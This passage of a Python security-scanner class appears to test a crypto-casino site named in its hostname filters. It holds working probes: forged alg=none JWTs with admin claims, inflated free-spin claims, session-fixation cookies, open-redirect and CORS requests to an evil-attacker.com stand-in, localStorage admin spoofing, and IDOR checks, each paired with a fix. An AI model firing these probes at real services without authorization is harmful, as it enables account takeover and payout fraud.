                    "fix": "Confirm staging auth + path."
                })
                return
            try:
                data = r.json()
            except Exception:
                data = None
            if not isinstance(data, dict):
                self.report["casino_freespin_scatter"].append({
                    "severity": "INFO",
                    "detail": "Free-spin endpoint returned non-object JSON.",
                    "url": url,
                    "fix": "Return structured { grantedSpins, scatterCount, payoutMult, source: 'server' }."
                })
                return
            granted = None
            for key in ("grantedSpins", "freeSpins", "spinsRemaining", "free_spins"):
                if key in data and isinstance(data[key], (int, float)):
                    granted = int(data[key])
                    break
            scatter_count = None
            for key in ("scatterCount", "scatters", "scatter_count"):
                if key in data and isinstance(data[key], (int, float)):
                    scatter_count = int(data[key])
                    break
            payout_mult = None
            for key in ("payoutMult", "scatterPayout", "payoutMultiplier"):
                if key in data and isinstance(data[key], (int, float)):
                    payout_mult = data[key]
                    break

            if scatter_count is not None and scatter_count >= 5:
                # 5 or 6+ should both map to 20x + 25 spins per policy
                if payout_mult is not None and payout_mult != pol["scatters_5_payout_mult"]:
                    self.report["casino_freespin_scatter"].append({
                        "severity": "HIGH",
                        "detail": (
                            f"Server payoutMult={payout_mult} for scatterCount={scatter_count}; "
                            f"policy expects {pol['scatters_5_payout_mult']}x for 5 and 6+."
                        ),
                        "url": url,
                        "fix": "Enforce 6+ scatters pay same as 5 (20x) server-side."
                    })
                if granted is not None and granted not in (pol["free_spins_on_scatter"], pol["retrigger_spins"]):
                    # Not automatically CRITICAL — could be mid-round remaining — flag for review
                    self.report["casino_freespin_scatter"].append({
                        "severity": "MEDIUM",
                        "detail": (
                            f"grantedSpins={granted} is neither the scatter grant "
                            f"({pol['free_spins_on_scatter']}) nor retrigger ({pol['retrigger_spins']}). "
                            "Manual review: remaining mid-round is OK; inflated grants are not."
                        ),
                        "url": url,
                        "fix": "Audit free-spin ledger; reject client-claimed spin counts that exceed server grants."
                    })
            else:
                self.report["casino_freespin_scatter"].append({
                    "severity": "INFO",
                    "detail": f"Free-spin status parsed (granted={granted}, scatters={scatter_count}, mult={payout_mult}).",
                    "url": url,
                    "fix": "Keep server as sole grant authority."
                })

            # STATEFUL: attempt to POST a client-inflated spin claim — gated
            if RUN_STATEFUL and self._jwt_configured("A"):
                try:
                    claim = {"claimedSpins": 999, "scatterCount": 6, "_probe": "aio-freespin-claim"}
                    pr = requests.post(url, headers=self._auth_headers(), json=claim, timeout=8)
                    accepted = 200 <= pr.status_code < 300
                    # Also check if response echoes the inflated claim
                    echoed = False
                    try:
                        pj = pr.json()
                        if isinstance(pj, dict) and int(pj.get("grantedSpins") or pj.get("freeSpins") or 0) >= 999:
                            echoed = True
                    except Exception:
                        pass
                    sev = "CRITICAL" if (accepted and echoed) else ("HIGH" if accepted else "INFO")
                    self.report["casino_freespin_scatter"].append({
                        "severity": sev,
                        "detail": (
                            f"Client-inflated free-spin claim (999) accepted/echoed (HTTP {pr.status_code}, echoed={echoed})."
                            if accepted else
                            f"Client-inflated free-spin claim rejected (HTTP {pr.status_code}) — expected."
                        ),
                        "url": url,
                        "fix": "Ignore client-claimed spin counts; grant only from server-side scatter evaluation."
                    })
                except Exception as e:
                    self.report["errors"].append(f"Free-spin claim probe error: {e}")
            elif not RUN_STATEFUL:
                print("      [skip] RUN_STATEFUL=False — no client-claim POST.")
        except Exception as e:
            self.report["errors"].append(f"Free-spin/scatter probe error: {e}")

    # ------------------------------------------------------------------
    # v6 — Casino: provably-fair seed checks (DETECTION ONLY — no prediction)
    # ------------------------------------------------------------------
    def scan_casino_provably_fair(self):
        """
        Detect if server seed is exposed before reveal, if client seed looks
        predictable, or if outcomes appear derivable client-side.
        Does NOT implement outcome prediction or exploit seed leakage.
        """
        print("  [*] Casino provably-fair seed checks (detection/flag only)...")
        seed_patterns = {
            "serverSeed pre-reveal hex": r"(?i)[\"']?serverSeed[\"']?\s*[:=]\s*[\"'][a-f0-9]{16,}[\"']",
            "serverSeedHash only (ok)": r"(?i)[\"']?serverSeedHash[\"']?\s*[:=]\s*[\"'][a-f0-9]{32,}[\"']",
            "hmacSecret in client": r"(?i)[\"']?(hmacSecret|seedSecret|fairnessSecret)[\"']?\s*[:=]",
            "client outcome derive": r"(?i)(deriveOutcome|calculateResult|generateRoll)\s*\(",
            "nonce pattern": r"(?i)[\"']?nonce[\"']?\s*[:=]\s*\d+",
        }
        for url, text in self.js_bundle_texts.items():
            # Flag raw serverSeed presence as HIGH (pre-reveal leak risk)
            if re.search(seed_patterns["serverSeed pre-reveal hex"], text):
                self.report["casino_provably_fair"].append({
                    "severity": "CRITICAL",
                    "detail": "Raw serverSeed hex appears in client JS — must only be revealed AFTER the round.",
                    "url": url,
                    "fix": "Expose serverSeedHash before the round; reveal serverSeed only after. Never ship raw seeds in bundles."
                })
            if re.search(seed_patterns["hmacSecret in client"], text):
                self.report["casino_provably_fair"].append({
                    "severity": "CRITICAL",
                    "detail": "Fairness HMAC/secret referenced in client JS.",
                    "url": url,
                    "fix": "Keep HMAC secrets server-side only."
                })
            if re.search(seed_patterns["client outcome derive"], text):
                self.report["casino_provably_fair"].append({
                    "severity": "HIGH",
                    "detail": "Client-side outcome derivation function detected. Outcomes must be computed server-side.",
                    "url": url,
                    "fix": "Move roll/outcome generation to the server; client verifies with revealed seeds after the fact."
                })
            # Predictable clientSeed heuristics in source (Date.now, Math.random alone, sequential)
            if re.search(r"(?i)clientSeed\s*[:=]\s*(String\()?Date\.now|clientSeed\s*[:=]\s*[\"']?\d{10,}", text):
                self.report["casino_provably_fair"].append({
                    "severity": "MEDIUM",
                    "detail": "Client seed appears derived from Date.now / a numeric timestamp — low entropy / predictable.",
                    "url": url,
                    "fix": "Use CSPRNG for clientSeed (e.g. crypto.getRandomValues) and allow user-supplied seeds."
                })
            if re.search(seed_patterns["serverSeedHash only (ok)"], text) and not re.search(seed_patterns["serverSeed pre-reveal hex"], text):
                self.report["casino_provably_fair"].append({
                    "severity": "INFO",
                    "detail": "serverSeedHash pattern present without raw serverSeed — good pre-reveal posture (JS scan).",
                    "url": url,
                    "fix": "Keep revealing the raw seed only after the round settles."
                })

        path = CASINO_ENDPOINTS.get("SEED_ENDPOINT", "").strip()
        if path:
            url = urljoin(TARGET_URL, path)
            try:
                r = requests.get(url, headers=self._auth_headers(), timeout=8)
                print(f"      [=] SEED_ENDPOINT HTTP {r.status_code}")
                body = r.text[:12000]
                if r.status_code < 400:
                    # Raw serverSeed in an active/next-round response = leak
                    if re.search(r"(?i)\"serverSeed\"\s*:\s*\"[a-f0-9]{16,}\"", body):
                        # If serverSeedHash is also present and equal to sha256(serverSeed) this might be a reveal endpoint —
                        # still flag for manual review: timing matters.
                        self.report["casino_provably_fair"].append({
                            "severity": "HIGH",
                            "detail": (
                                "SEED_ENDPOINT response includes raw serverSeed. "
                                "Confirm this is a post-reveal endpoint only; pre-reveal exposure is CRITICAL."
                            ),
                            "url": url,
                            "fix": "Split endpoints: /seed/hash (pre) vs /seed/reveal (post). Never return raw seed early."
                        })
                    if re.search(r"(?i)\"(hmacSecret|seedSecret)\"\s*:", body):
                        self.report["casino_provably_fair"].append({
                            "severity": "CRITICAL",
                            "detail": "SEED_ENDPOINT response exposes hmac/seed secret field.",
                            "url": url,
                            "fix": "Strip secrets from all client-visible responses."
                        })
                    # Predictable clientSeed in API (purely numeric short values)
                    for m in re.finditer(r"(?i)\"clientSeed\"\s*:\s*\"([^\"]+)\"", body):
                        cs = m.group(1)
                        if cs.isdigit() or len(cs) < 8:
                            self.report["casino_provably_fair"].append({
                                "severity": "MEDIUM",
                                "detail": f"clientSeed looks low-entropy (len={len(cs)}, digit-only={cs.isdigit()}).",
                                "url": url,
                                "fix": "Require high-entropy client seeds; reject weak values server-side."
                            })
                    # NOTE: we deliberately do NOT compute or predict outcomes from seeds.
                    self.report["casino_provably_fair"].append({
                        "severity": "INFO",
                        "detail": "Provably-fair seed endpoint reachable. Outcome-prediction is intentionally NOT implemented.",
                        "url": url,
                        "fix": "Continue to treat seed material as detection-only in this harness."
                    })
            except Exception as e:
                self.report["errors"].append(f"Provably-fair seed probe error: {e}")
        else:
            print("      [skip] SEED_ENDPOINT not configured — JS-pattern scan only.")

    # ------------------------------------------------------------------
    # v6 — Auth: JWT alg=none / alg-confusion FORGERY ATTEMPTS (STATEFUL)
    # ------------------------------------------------------------------
    def test_auth_jwt_forgery(self):
        """
        Attempt crafted tokens (alg=none, alg confusion) against OWN staging
        AUTH_TEST_ENDPOINT. Requires RUN_STATEFUL=True + configured endpoint.
        Reports whether the server accepted a forged token.
        """
        print("  [*] Auth JWT forgery attempts (alg=none / alg-confusion)...")
        if not RUN_STATEFUL:
            print("      [skip] RUN_STATEFUL=False — forgery attempts not fired.")
            self.report["auth_jwt_forgery"].append({
                "severity": "INFO",
                "detail": "JWT forgery attempts skipped (RUN_STATEFUL=False). Enable with AUTH_TEST_ENDPOINT to probe acceptance.",
                "fix": "Server must reject alg=none and enforce the expected algorithm (no HS* accept when RS* configured)."
            })
            return
        path = CASINO_ENDPOINTS.get("AUTH_TEST_ENDPOINT", "").strip()
        if not path:
            print("      [skip] AUTH_TEST_ENDPOINT not configured.")
            self.report["auth_jwt_forgery"].append({
                "severity": "INFO",
                "detail": "AUTH_TEST_ENDPOINT empty — forgery attempts not fired.",
                "fix": "Set AIO_AUTH_TEST_ENDPOINT to a staging authenticated route (e.g. /api/wallet/balance)."
            })
            return
        # Domain guard already enforced; double-check staging host on resolved URL
        url = urljoin(TARGET_URL, path)
        if "staging" not in (urlparse(url).hostname or ""):
            print("      [skip] Resolved AUTH_TEST_ENDPOINT host is not staging — refusing forgery attempts.")
            return

        # Base payload: elevate role claims for detection if accepted
        base_payload = {
            "sub": "aio-forgery-probe",
            "role": "admin",
            "isAdmin": True,
            "iat": int(datetime.utcnow().timestamp()),
            "exp": int(datetime.utcnow().timestamp()) + 3600,
            "_probe": "aio-jwt-forgery-v6",
        }
        attempts = [
            ("alg_none_lower", self._craft_unsigned_jwt({"alg": "none", "typ": "JWT"}, base_payload)),
            ("alg_none_upper", self._craft_unsigned_jwt({"alg": "None", "typ": "JWT"}, base_payload)),
            ("alg_none_NONE", self._craft_unsigned_jwt({"alg": "NONE", "typ": "JWT"}, base_payload)),
            # alg confusion: claim HS256 with empty/garbage signature (no key brute force)
            ("alg_hs256_empty_sig", self._craft_unsigned_jwt({"alg": "HS256", "typ": "JWT"}, base_payload)),
            ("alg_hs256_junk_sig",
             self._craft_unsigned_jwt({"alg": "HS256", "typ": "JWT"}, base_payload)[:-1]
             + self._b64url(b"not-a-real-signature")),
        ]

        for label, token in attempts:
            try:
                r = requests.get(
                    url,
                    headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"},
                    timeout=8,
                    allow_redirects=False,
                )
                accepted = 200 <= r.status_code < 300
                sev = "CRITICAL" if accepted else "INFO"
                self.report["auth_jwt_forgery"].append({
                    "severity": sev,
                    "detail": (
                        f"Forged token '{label}' ACCEPTED (HTTP {r.status_code})."
                        if accepted else
                        f"Forged token '{label}' rejected (HTTP {r.status_code}) — expected."
                    ),
                    "url": url,
                    "attempt": label,
                    "fix": "Reject alg=none; pin expected alg; verify signature with the correct key material; never trust client alg header alone."
                })
                print(f"      [=] {label}: HTTP {r.status_code}")
            except Exception as e:
                self.report["errors"].append(f"JWT forgery ({label}) error: {e}")

    # ------------------------------------------------------------------
    # v6 — Auth: session fixation check
    # ------------------------------------------------------------------
    def test_auth_session_fixation(self):
        """
        Check whether a pre-set session cookie survives / is accepted across a
        login-like flow. Staging only. Uses anonymous GETs + optional login path.
        """
        print("  [*] Auth session-fixation check...")
        try:
            sess = requests.Session()
            # Plant a fake session identifier before any auth
            planted = "aio_fixation_probe_v6_" + hashlib.sha256(b"staging").hexdigest()[:16]
            sess.cookies.set("session", planted, domain=urlparse(TARGET_URL).hostname)
            sess.cookies.set("sessionid", planted, domain=urlparse(TARGET_URL).hostname)
            r1 = sess.get(TARGET_URL, timeout=8)
            # Capture Set-Cookie after first hit
            set_cookies = []
            try:
                for k, v in r1.raw.headers.items():
                    if k.lower() == "set-cookie":
                        set_cookies.append(v)
            except Exception:
                if r1.headers.get("Set-Cookie"):
                    set_cookies.append(r1.headers["Set-Cookie"])

            # If server echoes / keeps our planted cookie without rotating, flag it
            returned = sess.cookies.get("session") or sess.cookies.get("sessionid") or ""
            if returned == planted:
                # Check login-ish endpoints from inventory
                login_paths = ["/api/auth/login", "/api/login", "/login", "/api/session", "/auth/session"]
                rotated = False
                for lp in login_paths:
                    try:
                        rr = sess.post(
                            urljoin(TARGET_URL, lp),
                            json={"_probe": "aio-fixation", "email": "fixation-probe@staging.invalid", "password": "invalid"},
                            timeout=6,
                            allow_redirects=False,
                        )
                        new_sess = sess.cookies.get("session") or sess.cookies.get("sessionid") or ""
                        if new_sess and new_sess != planted:
                            rotated = True
                            break
                        # Also look for Set-Cookie rotation even on 401
                        try:
                            for k, v in rr.raw.headers.items():
                                if k.lower() == "set-cookie" and "session" in v.lower():
                                    if planted not in v:
                                        rotated = True
                        except Exception:
                            pass
                    except Exception:
                        continue
                if not rotated:
                    self.report["auth_session_fixation"].append({
                        "severity": "MEDIUM",
                        "detail": (
                            "Planted session cookie value was retained after anonymous hit "
                            "(and no login endpoint rotated it). Possible session fixation surface."
                        ),
                        "url": TARGET_URL,
                        "fix": "Issue a fresh session id on privilege change / login. Invalidate the pre-login id."
                    })
                else:
                    self.report["auth_session_fixation"].append({
                        "severity": "INFO",
                        "detail": "Session id appears rotated around login-ish endpoints — good signal.",
                        "url": TARGET_URL,
                        "fix": "Keep rotating session ids on auth state change."
                    })
            else:
                self.report["auth_session_fixation"].append({
                    "severity": "INFO",
                    "detail": "Server did not retain the planted session cookie value (or uses a different cookie name).",
                    "url": TARGET_URL,
                    "fix": "Continue issuing server-generated session ids; never accept client-chosen ids."
                })
            # stash cookies for flag audit
            self._set_cookies.extend(set_cookies)
        except Exception as e:
            self.report["errors"].append(f"Session fixation check error: {e}")

    # ------------------------------------------------------------------
    # v6 — Auth: cookie flag audit (HttpOnly / Secure / SameSite)
    # ------------------------------------------------------------------
    def test_auth_cookie_flags(self):
        print("  [*] Auth cookie-flag audit (HttpOnly/Secure/SameSite)...")
        try:
            # Fresh request to collect Set-Cookie
            r = requests.get(TARGET_URL, timeout=10)
            cookies = []
            try:
                for k, v in r.raw.headers.items():
                    if k.lower() == "set-cookie":
                        cookies.append(v)
            except Exception:
                if r.headers.get("Set-Cookie"):
                    cookies.append(r.headers["Set-Cookie"])
            cookies.extend(self._set_cookies)
            # Also pull from Playwright-intercepted nothing — we only have headers here.
            if not cookies:
                self.report["auth_cookie_flags"].append({
                    "severity": "INFO",
                    "detail": "No Set-Cookie headers observed on TARGET_URL root. Cookie-flag audit inconclusive.",
                    "fix": "Ensure session cookies set HttpOnly; Secure; SameSite=Lax or Strict."
                })
                return
            seen = set()
            for sc in cookies:
                # Basic parse of name
                name = sc.split("=", 1)[0].strip() if "=" in sc else sc[:40]
                if name in seen:
                    continue
                seen.add(name)
                lower = sc.lower()
                missing = []
                if "httponly" not in lower:
                    missing.append("HttpOnly")
                if "secure" not in lower:
                    missing.append("Secure")
                if "samesite" not in lower:
                    missing.append("SameSite")
                if missing:
                    sev = "HIGH" if ("HttpOnly" in missing or "Secure" in missing) else "MEDIUM"
                    # Session-ish names escalate
                    if re.search(r"(session|auth|token|sid|jwt)", name, re.I):
                        sev = "HIGH"
                    self.report["auth_cookie_flags"].append({
                        "severity": sev,
                        "detail": f"Cookie '{name}' missing flags: {', '.join(missing)}.",
                        "url": TARGET_URL,
                        "fix": "Set HttpOnly; Secure; SameSite=Lax (or Strict) on all auth/session cookies."
                    })
                else:
                    self.report["auth_cookie_flags"].append({
                        "severity": "INFO",
                        "detail": f"Cookie '{name}' has HttpOnly + Secure + SameSite.",
                        "url": TARGET_URL,
                        "fix": "Good. Prefer SameSite=Strict where UX allows."
                    })
        except Exception as e:
            self.report["errors"].append(f"Cookie flag audit error: {e}")

    # ------------------------------------------------------------------
    # v6 — Auth: OAuth / redirect_uri misconfig (reuses open-redirect logic)
    # ------------------------------------------------------------------
    def test_auth_oauth_redirect(self):
        print("  [*] Auth OAuth / redirect_uri misconfig check...")
        oauth_params = ["redirect_uri", "returnTo", "return_to", "callback", "callback_url", "next", "continue"]
        oauth_paths = [
            "/oauth/callback", "/oauth/authorize", "/auth/callback", "/api/auth/callback",
            "/api/oauth/authorize", "/login/oauth", "/api/auth/login",
        ]
        # Probe known OAuth-ish paths even if not yet intercepted
        for path in oauth_paths:
            url = urljoin(TARGET_URL, path)
            for param in ("redirect_uri", "next", "returnTo"):
                payload = "https://evil-attacker.com/oauth-sink"
                try:
                    q = urlencode({param: payload, "client_id": "aio-probe", "response_type": "code"})
                    tampered = f"{url}?{q}"
                    res = requests.get(tampered, allow_redirects=False, timeout=5)
                    loc = res.headers.get("Location", "")
                    if res.status_code in (301, 302, 303, 307, 308) and "evil-attacker.com" in loc:
                        self.report["auth_oauth_redirect"].append({
                            "severity": "CRITICAL",
                            "detail": f"OAuth-ish open redirect via '{param}' on {path}.",
                            "url": tampered,
                            "fix": "Allowlist redirect_uri per client_id. Never reflect arbitrary URLs."
                        })
                    elif res.status_code < 500:
                        # Soft note only once per path
                        pass
                except Exception:
                    pass

        # Also reuse intercepted requests with oauth-ish params
        for req in self.intercepted_requests:
            if req["method"] != "GET":
                continue
            parsed = urlparse(req["url"])
            if "runehall.com" not in (parsed.hostname or ""):
                continue
            query = parse_qs(parsed.query)
            for param in oauth_params:
                if param not in query:
                    continue
                payload = "https://evil-attacker.com/oauth-sink"
                new_query = {k: v[:] for k, v in query.items()}
                new_query[param] = [payload]
                tampered_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params,
                                           urlencode(new_query, doseq=True), parsed.fragment))
                try:
                    res = requests.get(tampered_url, allow_redirects=False, timeout=5)
                    loc = res.headers.get("Location", "")
                    if res.status_code in (301, 302, 303, 307, 308) and "evil-attacker.com" in loc:
                        self.report["auth_oauth_redirect"].append({
                            "severity": "CRITICAL",
                            "detail": f"Open redirect via OAuth-related param '{param}' on intercepted {parsed.path}.",
                            "url": tampered_url,
                            "fix": "Allowlist redirect targets. Bind redirect_uri to the registered OAuth client."
                        })
                except Exception:
                    pass

        if not self.report["auth_oauth_redirect"]:
            self.report["auth_oauth_redirect"].append({
                "severity": "INFO",
                "detail": "No OAuth open-redirect confirmed on probed paths/params.",
                "fix": "Keep an explicit redirect_uri allowlist per OAuth client."
            })

    # ------------------------------------------------------------------
    # v5 — Reflected-param DOM XSS candidates (candidates only)
    # ------------------------------------------------------------------
    def test_reflected_xss_candidates(self):
        """Mark reflected query params as DOM-XSS candidates. Does not claim confirmed XSS."""
        print("  [*] Reflected-param XSS candidate probe...")
        marker = "aioXssCand7f3a"
        seen = set()
        for req in self.intercepted_requests:
            if req["method"] != "GET":
                continue
            parsed = urlparse(req["url"])
            if "runehall.com" not in (parsed.hostname or ""):
                continue
            query = parse_qs(parsed.query)
            if not query:
                continue
            for param in list(query.keys())[:8]:
                key = (parsed.path, param)
                if key in seen:
                    continue
                seen.add(key)
                new_query = {k: v[:] for k, v in query.items()}
                new_query[param] = [marker]
                tampered = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params,
                                       urlencode(new_query, doseq=True), parsed.fragment))
                try:
                    r = requests.get(tampered, timeout=6, headers={"Accept": "text/html,*/*"})
                    if marker in r.text and r.headers.get("content-type", "").startswith(("text/html", "application/json", "text/")):
                        self.report["reflected_xss_candidates"].append({
                            "severity": "MEDIUM",
                            "detail": (
                                f"CANDIDATE: query param '{param}' reflected in response body. "
                                "Not a confirmed XSS — manual DOM review required."
                            ),
                            "url": tampered,
                            "fix": "Encode output contextually. Prefer CSP with nonces and avoid innerHTML of user input."
                        })
                except Exception:
                    pass
                if len(seen) >= 25:
                    return

    # ------------------------------------------------------------------
    # v5 — SSRF parameter heuristics (flag only — NO outbound callbacks)
    # ------------------------------------------------------------------
    def test_ssrf_param_candidates(self):
        """Flag params named like url/webhook/callback as SSRF candidates. Does not fire SSRF."""
        print("  [*] SSRF-parameter heuristic scan (candidates only, no callbacks)...")
        ssrf_names = {"url", "uri", "webhook", "callback", "callback_url", "hook", "target",
                      "fetch", "proxy", "redirect_url", "image_url", "avatar_url", "link",
                      "endpoint", "dest", "destination", "next_url"}
        seen = set()
        for req in self.intercepted_requests:
            parsed = urlparse(req["url"])
            if "runehall.com" not in (parsed.hostname or ""):
                continue
            query = parse_qs(parsed.query)
            for param in query:
                pl = param.lower()
                if pl in ssrf_names or any(pl.endswith("_" + n) or pl.endswith(n) for n in ("url", "uri", "webhook", "callback")):
                    key = (parsed.path, param)
                    if key in seen:
                        continue
                    seen.add(key)
                    self.report["ssrf_param_candidates"].append({
                        "severity": "MEDIUM",
                        "detail": (
                            f"CANDIDATE: parameter '{param}' on {req['method']} {parsed.path} looks SSRF-prone. "
                            "No callback was made — review server-side fetch/allowlist manually."
                        ),
                        "url": f"{req['method']} {parsed.path}?{param}=...",
                        "fix": "Allowlist outbound destinations. Block link-local, metadata IPs, and private ranges."
                    })

    # ------------------------------------------------------------------
    # v5 — HTTP method / verb tampering (OPTIONS / TRACE)
    # ------------------------------------------------------------------
    def test_http_method_tampering(self):
        print("  [*] HTTP method tampering check (OPTIONS / TRACE)...")
        try:
            try:
                r = requests.request("TRACE", TARGET_URL, timeout=6)
                if r.status_code == 200 and ("TRACE" in r.text.upper() or r.headers.get("Content-Type", "").startswith("message/http")):
                    self.report["http_method_tampering"].append({
                        "severity": "MEDIUM",
                        "detail": f"TRACE enabled (HTTP {r.status_code}). Can amplify XST / credential reflection.",
                        "url": TARGET_URL,
                        "fix": "Disable TRACE at the edge / origin. Allow only required verbs."
                    })
                elif r.status_code not in (405, 501, 403, 404):
                    self.report["http_method_tampering"].append({
                        "severity": "LOW",
                        "detail": f"TRACE returned unexpected status {r.status_code}. Confirm it is disabled.",
                        "url": TARGET_URL,
                        "fix": "Explicitly reject TRACE."
                    })
            except requests.RequestException:
                pass

            try:
                r = requests.options(TARGET_URL, timeout=6)
                allow = r.headers.get("Allow") or r.headers.get("Access-Control-Allow-Methods", "")
                if allow:
                    verbs = [v.strip().upper() for v in allow.split(",") if v.strip()]
                    risky = [v for v in verbs if v in ("TRACE", "TRACK", "CONNECT")]
                    if risky:
                        self.report["http_method_tampering"].append({
                            "severity": "MEDIUM",
                            "detail": f"OPTIONS Allow advertises risky verbs: {risky}. Full Allow={allow}",
                            "url": TARGET_URL,
                            "fix": "Remove TRACE/TRACK from allowed methods."
                        })
                    else:
                        self.report["http_method_tampering"].append({
                            "severity": "INFO",
                            "detail": f"OPTIONS Allow: {allow}",
                            "url": TARGET_URL,
                            "fix": "Ensure only required verbs remain."
                        })
            except Exception as e:
                self.report["errors"].append(f"OPTIONS probe error: {e}")
        except Exception as e:
            self.report["errors"].append(f"HTTP method tampering error: {e}")

    def test_bola(self):
        if not self._jwt_configured("A") or not self._jwt_configured("B"):
            print("  [*] BOLA/IDOR skipped — JWT placeholders not filled.")
            return
        print("  [*] Testing BOLA / IDOR with dual JWTs...")
        for req in self.intercepted_requests:
            if req["method"] not in ("GET", "PUT", "DELETE", "PATCH"):
                continue
            url = req["url"]
            for pat in [r'(/)(\d+)(/|$|\?)', r'([?&]id=)(\d+)', r'([?&]userId=)(\d+)']:
                match = re.search(pat, url)
                if not match:
                    continue
                current_id = match.group(2)
                try:
                    test_id = str(int(current_id) + 1)
                except ValueError:
                    continue
                tampered_url = url.replace(current_id, test_id, 1)
                try:
                    res_b = requests.request(req["method"], tampered_url, headers={"Authorization": f"Bearer {USER_B_JWT}"}, timeout=8, allow_redirects=False)
                    res_a = requests.request(req["method"], tampered_url, headers={"Authorization": f"Bearer {USER_A_JWT}"}, timeout=8, allow_redirects=False)
                    if res_a.status_code == 200 and res_b.status_code == 200 and res_a.text == res_b.text and len(res_a.text) > 20:
                        self.report["idor_bola"].append({
                            "severity": "CRITICAL", "url": tampered_url, "method": req["method"],
                            "evidence": "User A received User B's exact payload.",
                            "fix": "Enforce object-level authorization. Verify the requesting user owns the resource."
                        })
                except requests.RequestException:
                    pass

    def run_nuclei(self):
        if not shutil.which("nuclei"):
            return
        print("  [*] Running Nuclei...")
        cmd = ["nuclei", "-u", TARGET_URL, "-t", "http/exposures/", "-t", "http/misconfiguration/",
               "-t", "http/cves/", "-severity", "critical,high,medium", "-rl", "50",
               "-jsonl", "-o", "nuclei_out.json", "-silent"]
        try:
            subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            if os.path.exists("nuclei_out.json"):
                with open("nuclei_out.json") as f:
                    for line in f:
                        try:
                            data = json.loads(line)
                            self.report["nuclei_findings"].append({
                                "severity": data.get("info", {}).get("severity", "unknown").upper(),
                                "name": data.get("info", {}).get("name", "unnamed"),
                                "matched_at": data.get("matched-at", "unknown")
                            })
                        except json.JSONDecodeError:
                            continue
        except Exception as e:
            self.report["errors"].append(f"Nuclei error: {e}")

    def run_zap(self):
        if not shutil.which("docker"):
            return
        # Skip ZAP in CI safe mode unless explicitly enabled
        if os.environ.get("AIO_ENABLE_ZAP", "false").strip().lower() not in ("1", "true", "yes"):
            print("  [*] ZAP skipped (set AIO_ENABLE_ZAP=true to enable).")
            return
        print("  [*] Running ZAP full scan (docker)...")
        replacer = (
            "rules.100000.description=Auth Header;"
            "rules.100000.url=.*;"
            "rules.100000.matchType=REQ_HEADER;"
            "rules.100000.matchString=Authorization;"
            f"rules.100000.replacement=Bearer {USER_A_JWT}"
        )
        cmd = ["docker", "run", "--rm", "-v", f"{os.getcwd()}:/zap/wrk/:rw",
               "-t", "ghcr.io/zaproxy/zaproxy:stable", "zap-full-scan.py",
               "-t", TARGET_URL, "-J", "zap_report.json", "-r", "zap_report.html",
               "-z", replacer, "-m", "5"]
        try:
            subprocess.run(cmd, check=True, timeout=900, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            self.report["errors"].append(f"ZAP error: {e}")

    async def run_spa_playwright(self):
        print("  [*] Launching Playwright SPA crawl...")
        # Allow CI to skip Playwright when browser deps aren't installed
        if os.environ.get("AIO_SKIP_PLAYWRIGHT", "").strip().lower() in ("1", "true", "yes"):
            print("      [skip] AIO_SKIP_PLAYWRIGHT set.")
            return
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context(user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)")
            page = await context.new_page()

            def handle_request(request):
                if request.resource_type in ("xhr", "fetch"):
                    self.intercepted_requests.append({"method": request.method, "url": request.url})
                    auth = request.headers.get("authorization")
                    if auth and auth.lower().startswith("bearer "):
                        self.analyze_jwt(auth.split(" ", 1)[1])
                if "ws" in request.url.lower() or "socket" in request.url.lower():
                    self.ws_endpoints.add(request.url)
            page.on("request", handle_request)

            try:
                await page.goto(TARGET_URL, wait_until="networkidle", timeout=45000)
            except Exception as e:
                self.report["errors"].append(f"Navigation failed: {e}")

            await self.scan_js_for_secrets(page)

            try:
                storage = await page.evaluate("""() => ({
                    local: Object.fromEntries(Object.entries(localStorage)),
                    session: Object.fromEntries(Object.entries(sessionStorage))
                })""")
                for stype, data in storage.items():
                    for k in data:
                        if re.search(r"(token|auth|jwt|session|access)", k, re.I):
                            self.report["storage_exposure"].append({"severity": "MEDIUM", "detail": f"{stype}Storage['{k}'] holds sensitive material."})
                await page.evaluate("""() => {
                    localStorage.setItem('isAuthenticated', 'true');
                    localStorage.setItem('role', 'admin');
                }""")
                resp = await page.goto(urljoin(TARGET_URL, "/admin"), wait_until="domcontentloaded", timeout=15000)
                if resp and resp.status == 200 and "login" not in page.url.lower():
                    self.report["route_bypass"].append({"severity": "HIGH", "detail": "Bypassed /admin UI guard via LocalStorage spoofing."})
            except Exception as e:
                self.report["errors"].append(f"Storage/route error: {e}")

            try:
                resp = requests.get(TARGET_URL, headers={"Origin": "https://evil-attacker.com"}, timeout=5)
                acao = resp.headers.get("Access-Control-Allow-Origin", "")
                acac = resp.headers.get("Access-Control-Allow-Credentials", "")
                if acao == "https://evil-attacker.com" and acac.lower() == "true":
                    self.report["cors_findings"].append({"severity": "HIGH", "detail": "CORS reflects arbitrary origin with credentials."})
                elif acao == "*":
                    self.report["cors_findings"].append({"severity": "MEDIUM", "detail": "CORS wildcard ACAO."})
            except Exception as e:
                self.report["errors"].append(f"CORS probe error: {e}")

            try:
                polluted = await page.evaluate("""() => {
                    try {
                        const obj = {};
                        Object.assign(obj, JSON.parse('{"__proto__": {"polluted": true}}'));
                        return ({}).polluted === true || obj.polluted === true;
                    } catch(e) { return false; }
                }""")
                if polluted:
                    self.report["prototype_pollution"].append({"severity": "HIGH", "detail": "Prototype pollution via __proto__ assignment succeeded."})
            except Exception as e:
                self.report["errors"].append(f"Prototype pollution probe error: {e}")

            try:
                await page.evaluate("""() => {
                    window.__crossOriginAccepted = false;
                    window.addEventListener('message', (e) => {
                        if (e.origin !== window.location.origin) window.__crossOriginAccepted = true;
                    });
                    window.postMessage({type: 'probe'}, '*');
                }""")
                accepted = await page.evaluate("() => window.__crossOriginAccepted")
                if accepted:
                    self.report["postmessage_issues"].append({"severity": "MEDIUM", "detail": "Cross-origin postMessage accepted without origin check."})
            except Exception as e:
                self.report["errors"].append(f"postMessage probe error: {e}")

            for ws_url in list(self.ws_endpoints)[:5]:
                try:
                    connected = await page.evaluate(f"""async () => {{
                        try {{
                            const s = new WebSocket('{ws_url}');
                            await new Promise((res, rej) => {{
                                s.onopen = () => res(true);
                                s.onerror = () => rej(false);
                                setTimeout(() => rej(false), 4000);
                            }});
                            s.close();
                            return true;
                        }} catch(e) {{ return false; }}
                    }}""")
                    if connected:
